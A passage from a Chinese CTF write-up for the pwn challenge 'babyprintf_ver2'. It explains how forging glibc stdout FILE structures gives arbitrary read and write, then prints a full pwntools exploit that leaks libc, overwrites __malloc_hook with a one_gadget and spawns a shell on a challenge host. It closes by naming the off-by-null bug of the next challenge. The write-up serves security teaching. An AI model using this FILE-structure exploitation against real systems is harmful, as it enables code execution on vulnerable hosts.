
```c
struct _IO_FILE {
int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
/* The following pointers correspond to the C++ streambuf protocol. */
/* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
char* _IO_read_ptr; /* Current read pointer */
char* _IO_read_end; /* End of get area. */
char* _IO_read_base; /* Start of putback+get area. */
char* _IO_write_base; /* Start of put area. */
char* _IO_write_ptr; /* Current put pointer. */
char* _IO_write_end; /* End of put area. */
char* _IO_buf_base; /* Start of reserve area. */
char* _IO_buf_end; /* End of reserve area. */
/* The following fields are used to support backing up and undo. */
char *_IO_save_base; /* Pointer to start of non-current get area. */
char *_IO_backup_base; /* Pointer to first valid character of backup area */
char *_IO_save_end; /* Pointer to end of non-current get area. */
struct _IO_marker *_markers;
struct _IO_FILE *_chain;
int _fileno;
#if 0
int _blksize;
#else
int _flags2;
#endif
_IO_off_t _old_offset; /* This used to be _offset but it's too small. */
#define __HAVE_COLUMN /* temporary */
/* 1+column number of pbase(); 0 is unknown. */
unsigned short _cur_column;
signed char _vtable_offset;
char _shortbuf[1];
/* char* _save_gptr; char* _save_egptr; */
_IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

里面前面的几个指针比较关键。

## 任意读

要实现完整的利用，首先是要实现地址泄露，可以通过`stdout`的任意读来实现地址的泄露。在程序中，我们已知的是程序的基址，因为一开始就打印出来了，可以利用`bss`段来伪造`stdout`结构体来实现任意读，相关涉及到的源代码如下：

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
...
else if (fp->_IO_read_end != fp->_IO_write_base) //需要绕过的check
{
_IO_off64_t new_pos
= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
if (new_pos == _IO_pos_BAD)
return 0;
fp->_offset = new_pos;
}
count = _IO_SYSWRITE (fp, data, to_do); //任意泄露的地方
...
}
```

以及

```c
if (ch == EOF)
return _IO_do_write (f, f->_IO_write_base,
f->_IO_write_ptr - f->_IO_write_base);
```

因此需要控制`stdout`结构体满足以下条件实现任意泄露：

* `_IO_write_base`指向想要泄露的地方。
* `_IO_write_ptr`指向泄露结束的地址。
* `_IO_read_end`等于`_IO_write_base`以绕过多余的代码。

满足这三个条件，可实现任意读。当然不包含结构体里的`_flags`字段的伪造，该字段都从原来的结构体里面复制过来，所以就没去分析该如何构造了。

## 任意写

任意写功能的实现在于IO缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能。相关源代码如下：

```c
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
...
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
{
count = f->_IO_buf_end - f->_IO_write_ptr;
if (count >= n)
{
const char *p;
for (p = s + n; p > s; )
{
if (*--p == '\n')
{
count = p - s + 1;
must_flush = 1;
break;
}
}
}
}
else if (f->_IO_write_end > f->_IO_write_ptr)
count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */ //复制长度
/* Then fill the buffer. */
if (count > 0)
{
if (count > to_do)
count = to_do;
#ifdef _LIBC
f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
#else
memcpy (f->_IO_write_ptr, s, count); //复制发生的地方
f->_IO_write_ptr += count;
```

可以看到当`_IO_write_end`大于`_IO_write_ptr`时，`memcpy`就会调用，因此任意写，只需要将`_IO_write_ptr`指向需要写的地址，`_IO_write_end`指向结束位置即可。

有了任意读与任意写之后，具体实现就是使用任意读泄露`libc`地址，然后用任意写将`one gadget`写到`malloc_hook`中，然后利用`%n`报错或者是较大的字符打印来触发`malloc`函数。

最终的exp如下：

```python
from pwn import *
DEBUG = 1
if DEBUG:
    p = process('./babyprintf_ver2')
    e = ELF('./babyprintf_ver2')
    #scontext.log_level = 'debug'
    #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
    #libc = ELF('./libc64.so')
else:
    p = remote('150.109.46.159', 20002)
    libc = ELF('./libc64.so')
    #libc = ELF('libc_64.so.6')
wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0

def leak(address, size):
    with open('/proc/%s/mem' % mypid) as mem:
        mem.seek(address)
        return mem.read(size)

def findModuleBase(pid, mem):
    name = os.readlink('/proc/%s/exe' % pid)
    with open('/proc/%s/maps' % pid) as maps:
        for line in maps:
            if name in line:
                addr = int(line.split('-')[0], 16)
                mem.seek(addr)
                if mem.read(4) == "\x7fELF":
                    bitFormat = u8(leak(addr + 4, 1))
                    if bitFormat == 2:
                        global wordSz
                        global hwordSz
                        global bits
                        wordSz = 8
                        hwordSz = 4
                        bits = 64
                        return addr
    log.failure("Module's base address not found.")
    sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
    print "program_base",hex(moduleBase)
    gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
    #debug(0x921)
    p.recvuntil('location to ')
    addr=int(p.recvuntil('\n')[:-1],16)
    print hex(addr)
    pro_base=addr-0x202010
    print "pro base",hex(pro_base)
    addr=pro_base+0x202010+0x100
    write_got=e.got['write']+pro_base
    print "write got",hex(write_got)
    flag=0xfbad2887
    flag&=~8
    flag|=0x800
    fake_file=p64(flag) #_flags
    fake_file+=p64(0) #_IO_read_ptr
    fake_file+=p64(write_got) #_IO_read_end
    fake_file+=p64(0) #_IO_read_base
    fake_file+=p64(write_got) #_IO_write_base
    fake_file+=p64(write_got+8) #_IO_write_ptr
    fake_file+=p64(0) #_IO_write_end
    fake_file+=p64(0) #_IO_buf_base
    fake_file+=p64(0) #_IO_buf_end
    fake_file+=p64(0) #_IO_save_base
    fake_file+=p64(0) #_IO_backup_base
    fake_file+=p64(0) #_IO_save_end
    fake_file+=p64(0) #_markers
    fake_file+=p64(0) #chain could be a anathor file struct
    fake_file+=p32(1) #_fileno
    fake_file+=p32(0) #_flags2
    fake_file+=p64(0xffffffffffffffff) #_old_offset
    fake_file+=p16(0) #_cur_column
    fake_file+=p8(0) #_vtable_offset
    fake_file+=p8(0x10) #_shortbuf
    fake_file+=p32(0)
    fake_file+=p64(addr) #_lock
    fake_file+=p64(0xffffffffffffffff) #_offset
    fake_file+=p64(0) #_codecvt
    fake_file+=p64(addr) #_wide_data
    fake_file+=p64(0) #_freeres_list
    fake_file+=p64(0) #_freeres_buf
    fake_file+=p64(0) #__pad5
    fake_file+=p32(0xffffffff) #_mode
    fake_file+=p32(0) #unused2
    fake_file+=p64(0)*2 #unused2
    fake_file_addr=pro_base+0x202010+0x10+8
    data='a'*0x10+p64(fake_file_addr)+fake_file
    p.sendline(data)
    p.recvuntil('ed!\n')
    write_addr=u64(p.recv(8))
    print hex(write_addr)
    libc_base=write_addr-libc.symbols['write']
    system_addr=libc_base+libc.symbols['system']
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    addr=pro_base+0x202010+0x100
    #write_got=e.got['write']+pro_base
    flag=0xfbad2887
    #flag&=~4
    #flag|=0x800
    fake_file=p64(flag) #_flags
    fake_file+=p64(0) #_IO_read_ptr
    fake_file+=p64(0) #_IO_read_end
    fake_file+=p64(0) #_IO_read_base
    fake_file+=p64(0) #_IO_write_base
    fake_file+=p64(malloc_hook) #_IO_write_ptr
    fake_file+=p64(malloc_hook+0x8) #_IO_write_end
    fake_file+=p64(0) #_IO_buf_base
    fake_file+=p64(0) #_IO_buf_end
    fake_file+=p64(0) #_IO_save_base
    fake_file+=p64(0) #_IO_backup_base
    fake_file+=p64(0) #_IO_save_end
    fake_file+=p64(0) #_markers
    fake_file+=p64(0) #chain could be a anathor file struct
    fake_file+=p32(1) #_fileno
    fake_file+=p32(0) #_flags2
    fake_file+=p64(0xffffffffffffffff) #_old_offset
    fake_file+=p16(0) #_cur_column
    fake_file+=p8(0) #_vtable_offset
    fake_file+=p8(0x10) #_shortbuf
    fake_file+=p32(0)
    fake_file+=p64(addr) #_lock
    fake_file+=p64(0xffffffffffffffff) #_offset
    fake_file+=p64(0) #_codecvt
    fake_file+=p64(addr) #_wide_data
    fake_file+=p64(0) #_freeres_list
    fake_file+=p64(0) #_freeres_buf
    fake_file+=p64(0) #__pad5
    fake_file+=p32(0xffffffff) #_mode
    fake_file+=p32(0) #unused2
    fake_file+=p64(0)*2 #unused2
    #debug(0x921)
    rce=libc_base+0x4526a
    data=p64(rce)*2+p64(fake_file_addr)+fake_file
    p.sendline(data)
    p.sendline("%n")
    p.interactive()

if __name__ == '__main__':
    pwn()
```

## heapstorm_zero

### 漏洞

存在一个`off-by-null`的漏洞，在函数`sub_EE0`中，会超过一字节并置0。
